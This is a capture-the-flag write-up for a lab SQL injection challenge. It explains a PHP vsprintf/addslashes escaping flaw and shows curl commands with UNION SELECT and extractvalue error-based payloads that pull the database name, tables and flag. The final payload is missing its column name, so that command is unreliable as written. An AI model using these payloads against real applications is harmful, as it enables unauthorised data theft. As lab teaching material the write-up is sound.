## [Baby SQL](https://app.hackthebox.com/challenges/146)

> *I heard that \*real_escape_string() functions protect you from malicious user input inside SQL statements, I hope you can't prove me wrong...*

The web application's index page reveals its source code. It's a PHP web application that interacts with a database.

For `POST` requests to the index page, the application will insert the `pass` parameter into a string and pass that string through [addslashes](https://www.php.net/manual/en/function.addslashes.php), escaping any backslashes, single quotes, and null bytes. The result is then passed along with the array `["admin"]` into PHP's [vsprintf](https://www.php.net/manual/en/function.vsprintf.php), which interpolates `admin` into the `%s` format specifier in the string. The result is sent to the database as a query. The web application does not return the results from the query.

```php
 <?php require 'config.php';

class db extends Connection {
    public function query($sql) {
        $args = func_get_args();
        unset($args[0]);
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if (isset($_POST['pass'])) {
    $pass = addslashes($_POST['pass']);
    $db->query("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
} else {
    die(highlight_file(__FILE__,1));
} 
```

The vulnerability lies in how PHP's `vsprintf` handles invalid format specifiers, such as `%1$\`. Since `%1$s\` is an invalid format specifier, `vsprintf` will simply remove it altogether from the string. If an attacker inputs a `pass` value of `%1$s'`, this value will be passed into `addslashes` resulting in the string `%1$s\'`. When this string is passed into `vsprintf`, it removes this invalid format specifier, leaving `'` by itself, unescaped.

Sending a `pass` of `%1$'` to the database results in a SQL syntax error, indicating the injection was successful. This also indicates the target's database is MariaDB.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$'"
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1 
```

Fix the query to remove the error message. No response body from the web application.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$')#"

```

Incremental `ORDER BY` statements indicate the `users` table has two columns. Thus a `UNION SELECT` statement must also have two columns.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') ORDER BY 1#"

$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') ORDER BY 2#"

$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') ORDER BY 3#"
Unknown column '3' in 'order clause'
```

Since the web application only returns SQL error messages, abuse MariaDB/MySQL's [ExtractValue](http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html) function to return the result of arbitrary queries as an error. Retrieve the current database's name: `db_m412`.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT database())))#"
XPATH syntax error: '
db_m412'
```

`db_m412` has two tables: `totally_not_a_flag` and `users`.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = database())))#"
XPATH syntax error: '
totally_not_a_flag,users'
```

`db_m412.totally_not_a_flag` has one column: `flag`.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') UNION SELECT 1,ExtractValue(0x41, CONCAT(0x0a, (SELECT column_name FROM information_schema.columns WHERE table_name = %1$'totally_not_a_flag%1$')))#"
XPATH syntax error: '
flag'
```

There is only one entry in the table.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') UNION SELECT 1,ExtractValue(0x41, CONCAT(0x0a, (SELECT COUNT(flag) FROM db_m412.totally_not_a_flag)))#"
XPATH syntax error: '
1'
```

Read that entry's `flag` value for the challenge's flag.

```bash
$ curl -s -X POST http://178.62.72.81:32759/ -d "pass=%1$') UNION SELECT 1,extractvalue(0x0a,concat(0x0a,(SELECT  from db_m412.totally_not_a_flag)))#"
XPATH syntax error: '
HTB{...}'
```
